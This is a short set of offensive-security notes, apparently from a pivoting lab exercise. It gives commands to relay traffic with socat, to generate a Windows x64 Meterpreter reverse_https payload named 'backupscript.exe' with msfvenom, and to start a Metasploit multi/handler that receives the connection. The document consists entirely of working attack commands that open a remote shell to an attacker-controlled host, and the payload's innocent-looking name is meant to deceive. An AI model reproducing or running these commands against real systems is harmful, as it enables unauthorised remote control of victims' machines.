# Starting Socat Listener
```powershell
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

# Creating the Windows Payload
```powershell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

# Starting Msfconsole
```powershell
msf6 > use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
```
